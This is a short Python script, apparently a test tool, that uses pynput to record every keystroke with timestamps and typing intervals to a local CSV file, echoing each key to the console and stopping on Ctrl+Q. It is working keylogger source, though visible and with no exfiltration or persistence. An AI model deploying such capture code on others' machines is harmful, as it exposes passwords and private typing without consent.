from pynput import keyboard
import os
import time
import csv
from datetime import datetime

# Logging path
LOG_DIR = r"C:\keylogger_test"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "keylog.csv")

last_time = time.time()
ctrl_pressed = False

# Create or clear the log file
with open(LOG_FILE, "w", newline='') as f:
    writer = csv.writer(f)
    writer.writerow(["Timestamp", "Key", "Elapsed (s)"])

def on_press(key):
    global last_time, ctrl_pressed

    current_time = time.time()
    elapsed = round(current_time - last_time, 3)
    last_time = current_time

    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    print(f"[{datetime.now().isoformat()}] {key_str} ({elapsed}s)")

    try:
        with open(LOG_FILE, "a", newline='') as f:
            writer = csv.writer(f)
            writer.writerow([datetime.now().isoformat(), key_str, elapsed])
            f.flush()
    except PermissionError:
        print("[!] Permission denied. Cannot write to log file.")
        return False

    # Stop on Ctrl + Q
    if key == keyboard.KeyCode.from_char('q') and ctrl_pressed:
        print("\n[!] Ctrl + Q detected. Exiting keylogger.")
        return False

def on_press_combination(key):
    global ctrl_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = True

def on_release(key):
    global ctrl_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False

# Main loop
def run_keylogger():
    print("[*] Keylogger started. Press Ctrl + Q to stop.")

    with keyboard.Listener(
        on_press=lambda key: [on_press_combination(key), on_press(key)][-1],
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    run_keylogger()
